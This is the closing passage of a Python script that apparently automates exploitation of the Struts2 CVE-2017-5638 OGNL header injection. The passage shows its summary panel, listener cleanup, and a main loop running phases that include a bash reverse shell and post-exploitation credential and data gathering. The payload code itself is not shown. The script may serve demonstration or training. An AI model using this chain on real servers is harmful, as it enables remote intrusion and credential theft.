        "  [bold]No credentials were needed.[/bold]\n"
        "  [bold]No file upload was required.[/bold]\n"
        "  [bold]The entire exploit is a single HTTP header.[/bold]\n\n"
        "  The Jakarta Multipart parser in Struts 2.3.12 evaluates OGNL expressions\n"
        "  embedded in the Content-Type header without any validation, allowing\n"
        "  arbitrary command execution via ProcessBuilder.\n\n"
        "  Command output is returned directly in the HTTP response body,\n"
        "  making this a fully interactive, zero-click RCE vulnerability.",
        title="[bold red]CVE-2017-5638 -- CVSS 10.0[/bold red]",
        border_style="bold red",
        padding=(1, 4),
    ))
    console.print()

# -----------------------------------------------------------------------------
#  Cleanup
# -----------------------------------------------------------------------------

def cleanup():
    for key in ("listener_proc",):
        proc = STATE.get(key)
        if proc and proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()

# -----------------------------------------------------------------------------
#  Main
# -----------------------------------------------------------------------------

def main():
    banner()
    configure()

    console.print(Panel(
        "  [cyan]Phase 1[/cyan]  Reconnaissance              (port scan, Struts2 fingerprint)\n"
        "  [cyan]Phase 2[/cyan]  Vulnerability Detection      (malformed Content-Type, OGNL PoC)\n"
        "  [cyan]Phase 3[/cyan]  Exploitation                  (arbitrary command execution)\n"
        "  [cyan]Phase 4[/cyan]  Reverse Shell                 (bash reverse shell via OGNL)\n"
        "  [cyan]Phase 5[/cyan]  Post-Exploitation             (enum, credentials, data)\n"
        "  [cyan]Phase 6[/cyan]  Report & ATT&CK Mapping",
        title="[bold]Attack Chain Overview[/bold]",
        border_style="blue",
    ))
    console.print()

    phases = [
        ("Reconnaissance",         phase_recon),
        ("Vulnerability Detection", phase_detection),
        ("Command Execution",       phase_exploit_commands),
        ("Reverse Shell",           phase_reverse_shell),
        ("Post-Exploitation",       phase_post_exploit),
        ("Report",                  phase_report),
    ]

    try:
        for i, (name, func) in enumerate(phases, 1):
            try:
                func()
                if i < len(phases):
                    if not Confirm.ask(
                        f"\n  [bold cyan]Phase {i} ({name}) complete. Continue to Phase {i+1}?[/bold cyan]",
                        default=True,
                    ):
                        info("Skipping remaining phases, jumping to report...")
                        phase_report()
                        break
            except KeyboardInterrupt:
                console.print(f"\n[yellow]Phase {i} ({name}) interrupted.[/yellow]")
                if not Confirm.ask("  Continue to next phase?", default=True):
                    break
            except Exception as exc:
                err(f"Phase {i} ({name}): {exc}")
                console.print_exception(show_locals=False)
                if not Confirm.ask("  Continue despite error?", default=True):
                    break
    finally:
        console.print()
        if Confirm.ask("  [bold]Clean up infrastructure (kill listener)?[/bold]",
                       default=True):
            cleanup()
            ok("Infrastructure cleaned up")
        else:
            info("Processes left running -- clean up manually when done")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[red]Aborted.[/red]")
        cleanup()
        sys.exit(1)
